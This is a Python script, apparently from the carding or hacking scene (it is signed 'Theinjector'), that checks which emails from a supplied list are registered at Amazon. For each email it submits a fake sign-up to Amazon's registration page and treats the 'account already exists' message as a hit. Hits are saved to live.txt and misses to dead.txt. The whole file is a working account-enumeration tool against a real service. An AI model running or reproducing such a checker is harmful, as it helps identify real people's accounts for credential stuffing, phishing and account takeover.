import requests
import pyfiglet
from termcolor import colored
ascii_banner = pyfiglet.figlet_format("Theinjector!")
exit = pyfiglet.figlet_format("Enjoy")
print(colored(ascii_banner,'red'))

#python3
live = open('live.txt','w') #list of live emails registred in amazon.com
die = open('dead.txt','w')# list of dead emails
list = input("\033[32;1mInput Your Mail List : \033[0m")
#link
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*50)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	bacot = email.strip().split(':')
	xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'HAHAHA123','passwordCheck':'HAHAHA123'}
	cek = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
		print("\033[32m-"*50)
		print(colored("Live[+]"+email+" | [LIVE AMAZON ]",'green'))
		live.write(email)
	else:
		print("\033[31m-"*50)
		print(colored("Die[:(]| "+email+" | [ DEAD AMAZON ]",'red'))

		die.write(email)
print("\033[34m-"*50)
print(colored(exit,'green'))
print(colored("Done By Theinjector",'yellow'))
print(colored("Valid Emails Saved In : live.txt\nDead Emails Saved In :Dead.txt",'blue'))
